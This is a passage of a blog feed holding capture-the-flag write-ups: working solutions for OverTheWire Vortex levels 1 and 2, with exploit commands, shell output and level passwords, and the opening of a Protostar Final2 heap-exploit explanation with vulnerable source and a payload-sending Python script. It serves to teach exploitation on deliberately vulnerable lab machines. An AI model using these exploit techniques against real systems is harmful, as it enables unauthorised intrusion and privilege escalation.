</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;import sys; sys.stdout.write(&quot;</span><span class="se">\\</span><span class="s">&quot; * (0xffffe470 - 0xcaffffff) + &quot;</span><span class="se">\x00</span><span class="s">&quot;)&#39;</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> \
</span><span class='line'>  <span class="o">|</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
</span><span class='line'>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">),</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex2</span>
</span><span class='line'><span class="mi">23</span><span class="n">anbT</span>\<span class="n">rE</span>
</span></code></pre></td></tr></table></div></figure>


<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
to more input from the stdout of that subshell. That way we can add more commands from the
terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>

<p>This is definitely not the best solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
889,181,661. If written to disk, this file would be almost a gigabyte.</p>

<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
decrement the value of <code>ptr</code> until it references its own memory address which starts at <code>0xffffd4d4</code>.
Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
past the <code>x</code> and one byte into itself.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;import sys; sys.stdout.write(&quot;</span><span class="se">\\</span><span class="s">&quot; * (512/2 + 5) + &quot;</span><span class="se">\xca</span><span class="s">&quot; + &quot;A&quot;)&#39;</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> \
</span><span class='line'>  <span class="o">|</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
</span><span class='line'>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">),</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ls</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span>
</span><span class='line'><span class="n">vortex0</span>   <span class="n">vortex11</span>  <span class="n">vortex14</span>  <span class="n">vortex17</span>    <span class="n">vortex2</span>   <span class="n">vortex22</span>  <span class="n">vortex25</span>  <span class="n">vortex5</span>  <span class="n">vortex8</span>
</span><span class='line'><span class="n">vortex1</span>   <span class="n">vortex12</span>  <span class="n">vortex15</span>  <span class="n">vortex18</span>    <span class="n">vortex20</span>  <span class="n">vortex23</span>  <span class="n">vortex3</span>   <span class="n">vortex6</span>  <span class="n">vortex9</span>
</span><span class='line'><span class="n">vortex10</span>  <span class="n">vortex13</span>  <span class="n">vortex16</span>  <span class="n">vortex19</span>    <span class="n">vortex21</span>  <span class="n">vortex24</span>  <span class="n">vortex4</span>   <span class="n">vortex7</span>
</span><span class='line'>
</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex2</span>
</span><span class='line'><span class="mi">23</span><span class="n">anbT</span>\<span class="n">rE</span>
</span></code></pre></td></tr></table></div></figure>


<h1><a href="https://overthewire.org/wargames/vortex/vortex2.html">Vortex Level 2 -> Level 3</a></h1>

<p><details>
  <summary>Hint 1: number of args</summary>
  You don&rsquo;t need to use all the available <code>argv</code> slots used in the executable.
</details></p>

<p><details>
  <summary>Hint 2: <code>$$</code></summary>
  What is <code>$$</code>? What is its value in the context of the executable?
</details></p>

<p><details>
  <summary>Hint 3: file to tar</summary>
  What file do you need to read? How can you use the program to read it?
</details></p>

<h2>My solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex2</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
</span><span class='line'><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tar</span><span class="p">:</span> <span class="n">Removing</span> <span class="n">leading</span> <span class="err">`</span><span class="o">/</span><span class="s">&#39; from member names</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
</span><span class='line'><span class="n">ls</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">access</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="mf">1657.</span><span class="n">tar</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span>\<span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
</span><span class='line'><span class="mi">2670</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">vortex3</span> <span class="n">vortex2</span> <span class="mi">10240</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">15</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">tar</span> <span class="o">-</span><span class="n">xvf</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span>\<span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
</span><span class='line'><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span>
</span><span class='line'><span class="n">total</span> <span class="mi">12</span>
</span><span class='line'><span class="mi">2808</span> <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">vortex2</span> <span class="n">vortex2</span> <span class="mi">4096</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">16</span> <span class="o">.</span>
</span><span class='line'><span class="mi">2689</span> <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">vortex2</span> <span class="n">vortex2</span> <span class="mi">4096</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">16</span> <span class="o">..</span>
</span><span class='line'><span class="mi">2809</span> <span class="o">-</span><span class="n">r</span><span class="o">--------</span> <span class="mi">1</span> <span class="n">vortex2</span> <span class="n">vortex2</span>   <span class="mi">10</span> <span class="n">Nov</span>  <span class="mi">4</span>  <span class="mi">2019</span> <span class="n">vortex3</span>
</span><span class='line'>
</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
</span><span class='line'><span class="mi">64</span><span class="n">ncXTvx</span><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
    <link href="https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/"/>
    <updated>2020-11-01T17:46:32-05:00</updated>
    <id>https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level</id>
    <content type="html"><![CDATA[<p>This is an explanation of <a href="https://exploit-exercises.lains.space/protostar/final2/">Protostar level Final2</a>. I wrote a solution in April without an
explanation. I read it last night and had to spend half a day to understand it again. So next time
I&rsquo;ll write the explanation while it&rsquo;s still fresh in my head.</p>

<p>The level&rsquo;s description is</p>

<blockquote><p>Remote heap level :)<br/>Core files will be in /tmp.<br/>This level is at /opt/protostar/bin/final2</p></blockquote>




<!-- more -->


<p>This is the source code.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'><span class="cp">#include &quot;../common/malloc.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;final2&quot;</span>
</span><span class='line'><span class="cp">#define UID 0</span>
</span><span class='line'><span class="cp">#define GID 0</span>
</span><span class='line'><span class="cp">#define PORT 2993</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define REQSZ 128</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm">  * Work out old software bug</span>
</span><span class='line'><span class="cm">  */</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
</span><span class='line'>          <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>      <span class="n">destroylist</span><span class="p">[</span><span class="n">dll</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="cm">/* Line is missing in original source. gdb disassemble will show it. */</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">));</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Overview of source code</h2>

<p>The first line of the description coupled with the fact the code listens on port 2993 means we&rsquo;ll
have to send a TCP packet that exploits a heap related vulnerability. <code>main()</code> is pretty simple. It
runs the final2 binary in the background as root and processes requests with <code>get_requests()</code>.
<code>get_requests()</code> declares an array of 256 char pointers and reads input strings into it. If any
request size isn&rsquo;t <code>REQSZ</code> or 128 bytes, the function breaks out of the <code>while(1)</code> loop. Any request
payload that doesn&rsquo;t start with <code>FSRD</code> also breaks out of the loop. The <code>check_path()</code> function is
then called and <code>dll</code> is incremented. A for-loop writes &ldquo;Process OK&rdquo; to stdout and frees each string
buffer starting with the oldest.</p>

<p><code>check_path()</code> stores a pointer to <code>buf</code>&rsquo;s right-most <code>/</code> in <code>p</code>. <code>l</code> is the length of the string
starting from <code>p</code>. If <code>p</code> is greater than 0, <code>start</code> points to the part of <code>buf</code> that has <code>"ROOT"</code>.
If <code>"ROOT"</code> is a substring in <code>buf</code>, the while loop decrements <code>start</code> until it finds a <code>/</code>. Then
<code>memmove()</code> moves <code>l</code> bytes of the string starting at <code>p</code> to <code>start</code>.</p>

<p>A TCP packet with the string <code>FSRD/ROOT/AAAA</code> will cause <code>p</code> to point to the second <code>/</code>. So <code>p</code> as a
string is <code>/AAAA</code>. <code>l</code> is 5. <code>start</code> initially points to the <code>R</code> in <code>ROOT</code> and later is decremented
to point to the first <code>/</code>. <code>memmove()</code> changes the string to <code>FSRD/AAAA/AAAA</code>.</p>

<p>Notice that <code>start--</code> doesn&rsquo;t check the bounds of the string passed in by <code>buf</code>. It will keep
scanning leftward until it finds some <code>/</code>. So <code>memmove()</code> can write to memory outside of the current
string.</p>

<h2>General Exploit Strategy</h2>

<p>We know we&rsquo;ll need to exploit the <code>free()</code> call which in this series of exercises uses the
vulnerable dlmalloc <code>unlink()</code> macro. In a <a href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a>, I showed how this exploit
manipulates heap memory to redirect code execution. We&rsquo;ll need to inject <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> via the request
payloads. Our request payloads also need to corrupt heap memory in a way that will trick dlmalloc
into redirecting code to the shellcode.</p>

<h2>Exploiting <code>memmove()</code></h2>

<p>Let&rsquo;s craft a first payload that will allow the second payload to overwrite heap memory before the
start of the second string. <code>FSRDAAAA...AAAA/AAAA</code> should work. The second payload can be
<code>FSRDROOTAAA...AAAA/BBBB</code>. After the second call to <code>check_path()</code>, the heap memory of the first
string should be <code>FSRDAAAA...AAAA/BBBB</code>. Let&rsquo;s confirm this with a Python script and <code>gdb</code>. We&rsquo;ll
set a breakpoint right after the call to <code>check_path()</code> and send these two strings.</p>

<p>We save the following contents to a file named <code>test.py</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Establish TCP connection</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload1</span> <span class="o">=</span> <span class="s">&#39;FSRD&#39;</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">REQSZ</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span>  <span class="c"># &#39;FSRDAAAA.../AAAA&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload1</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload2</span> <span class="o">=</span> <span class="s">&#39;FSRD&#39;</span> <span class="o">+</span> <span class="s">&#39;ROOT&#39;</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">REQSZ</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="s">&#39;BBBB&#39;</span>  <span class="c"># &#39;FSRDROOTAAAA.../BBBB&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload2</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Terminate session by sending a payload that causes get_requests() to return</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;AAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">))</span>  <span class="c"># print the confirmation</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m running the Protostar VM on Virtualbox on a Macbook. Set the network settings for the VM to
Host-only Adapter. Once the VM starts, use the Virtualbox &ldquo;Show&rdquo; button to get a terminal to the VM.
Login as <code>user</code> with password <code>user</code>. Run <code>ip addr show</code> to find the VM&rsquo;s local IP address. Mine is
<code>192.168.99.107</code>. I then close the Virtualbox terminal because I like to use iTerm. I SSH with iTerm
into the VM as root with password <code>godmode</code>. We need to be root in order to attach gdb to a running
process.</p>

